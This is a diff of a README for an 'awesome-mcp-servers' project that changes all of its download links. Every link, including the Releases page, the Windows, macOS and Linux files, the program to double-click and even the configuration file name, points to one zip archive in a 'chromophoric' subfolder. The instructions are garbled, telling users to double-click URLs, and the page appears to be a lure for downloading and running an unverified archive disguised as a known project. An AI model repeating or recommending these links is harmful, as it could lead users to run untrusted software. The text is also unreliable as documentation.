@@ -1,6 +1,6 @@
 # 🚀 awesome-mcp-servers - Powerful MCP Servers Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip)
+[![Download Now](https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip)
 
 ## 📘 Introduction
 
@@ -23,14 +23,14 @@ Before you download, ensure that your computer meets the following requirements:
 
 To get the software, you can easily access the Releases page. 
 
-1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip)
+1. **Visit this page to download**: [Releases Page](https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip)
    
 2. On the Releases page, find the latest version of the application. In the section for the latest release, look for the downloadable files.
 
 3. Click on the file that matches your system. If you're unsure, here are the formats you may find:
-    - `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip` for Windows users
-    - `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip` for macOS users
-    - `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip` for Linux users
+    - `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip` for Windows users
+    - `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip` for macOS users
+    - `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip` for Linux users
 
 4. Once the download completes, locate the file on your computer. 
 
@@ -39,8 +39,8 @@ To get the software, you can easily access the Releases page.
 6. After extraction, navigate to the folder where the files are located.
 
 7. **Run the application**:
-   - For Windows, double-click on `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip`.
-   - For macOS, double-click on `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip`.
+   - For Windows, double-click on `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip`.
+   - For macOS, double-click on `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip`.
    - For Linux, open a terminal, navigate to the folder, and type `./awesome-mcp-server`.
 
 ## 🎉 Using the MCP Servers
@@ -53,7 +53,7 @@ Once you have the servers running, you can harness the power of artificial intel
 
 ## ⚙️ Configuration
 
-You may want to adjust settings to better suit your needs. Open the configuration file (usually named `https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip`) in a text editor to modify parameters like:
+You may want to adjust settings to better suit your needs. Open the configuration file (usually named `https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip`) in a text editor to modify parameters like:
 
 - **API keys**: Required for cloud services.
 - **Timeouts**: Adjust how long the server waits for a response.
@@ -85,4 +85,4 @@ Should you have questions or feedback, please reach out through the GitHub repos
 
 Thank you for choosing **awesome-mcp-servers**! We hope you enjoy the capabilities and power of MCP servers. 
 
-[![Download Now](https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ayaanjan76/awesome-mcp-servers/main/chromophoric/awesome-mcp-servers.zip)
+[![Download Now](https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/ayaanjan76/awesome-mcp-servers/raw/refs/heads/main/chromophoric/awesome_mcp_servers_v2.1.zip)
